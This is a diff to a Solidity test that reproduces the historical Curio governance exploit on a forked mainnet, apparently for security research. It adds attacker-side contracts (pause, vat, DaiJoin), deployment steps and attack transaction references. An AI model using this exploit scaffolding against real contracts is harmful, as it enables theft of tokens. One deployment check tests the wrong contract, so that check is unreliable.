@@ -6,15 +6,21 @@ import {TestHarness} from "../../TestHarness.sol";
 import {TokenBalanceTracker} from "../../modules/TokenBalanceTracker.sol";
 import "./AttackerContract.sol";
 import "./Interfaces.sol";
+import "./vat.sol";
+import "./join.sol";
 
 contract Exploit_Curio is TestHarness, TokenBalanceTracker {
     // Instances of tokens involved
     IDSToken cgtToken = IDSToken(0xF56b164efd3CFc02BA739b719B6526A6FA1cA32a);
+    IMERC20 curioCSCToken = IMERC20(0xfDcdfA378818AC358739621ddFa8582E6ac1aDcB);
 
     // Instances of relevant contracts
     // Attacker contracts
     Action attackerContract;
     Chief chief;
+    DSPause pause;
+    Vat vat;
+    DaiJoin daiJoin;
     IOUToken IOU;
 
     // Peripheral contracts
@@ -24,6 +30,8 @@ contract Exploit_Curio is TestHarness, TokenBalanceTracker {
     address ATTACKER = makeAddr("ATTACKER");
 
     function setUp() external {
+        // Attack tx: 0x4ff4028b03c3df468197358b99f5160e5709e7fce3884cc8ce818856d058e106
+
         // Create a fork right before the attack started
         cheat.createSelectFork("mainnet", 19_491_672);
 
@@ -63,7 +71,7 @@ contract Exploit_Curio is TestHarness, TokenBalanceTracker {
         console.log("\n==== STEP 3: Deploy Attacker's contract (called Action) ====");
         // Deploy tx: 0x99cc992de6e42a0817713489aeeb21f2d5e5fdca1f833826be09a9f35e5654e3
         cheat.prank(ATTACKER);
-        attackerContract = new Action(address(chief));
+        attackerContract = new Action(address(chief), address(pause));
         require(address(attackerContract).code.length != 0, "Attacker's contract deployment failed");
         console.log("Attacker's contract deployement successful");
 
@@ -83,7 +91,7 @@ contract Exploit_Curio is TestHarness, TokenBalanceTracker {
         // Next steps:
         1. Mint CGT tokens via executor's contract
         2. Evaluate if the other previous calls that only emit events (likely changing only some attacker's
-           contract storage)  are necessary
+        contract storage) are necessary
         */
     }
 
@@ -93,12 +101,27 @@ contract Exploit_Curio is TestHarness, TokenBalanceTracker {
         cheat.prank(ATTACKER);
         IOU = new IOUToken();
         require(address(IOU).code.length != 0, "IOU token deployment failed");
-        console.log("IOU token contract deployement successful");
+        console.log("IOU token contract deployement successful at: %s", address(IOU));
 
         cheat.prank(ATTACKER);
         chief = new Chief(address(cgtToken), address(IOU), type(uint256).max);
         require(address(chief).code.length != 0, "Chief deployment failed");
-        console.log("Chief contract deployement successful");
+        console.log("Chief contract deployement successful at: %s", address(chief));
+
+        cheat.prank(ATTACKER);
+        pause = new DSPause(0, address(this), address(this)); // last two params unused
+        require(address(pause).code.length != 0, "Pause deployment failed");
+        console.log("Pause contract deployement successful at: %s", address(pause));
+
+        cheat.prank(ATTACKER);
+        vat = new Vat();
+        require(address(vat).code.length != 0, "Vat deployment failed");
+        console.log("Vat contract deployement successful at: %s", address(vat));
+
+        cheat.prank(ATTACKER);
+        daiJoin = new DaiJoin(address(vat), address(curioCSCToken));
+        require(address(vat).code.length != 0, "DaiJoin deployment failed");
+        console.log("DaiJoin contract deployement successful at: %s", address(daiJoin));
     }
 
     function _labelAccounts() internal {
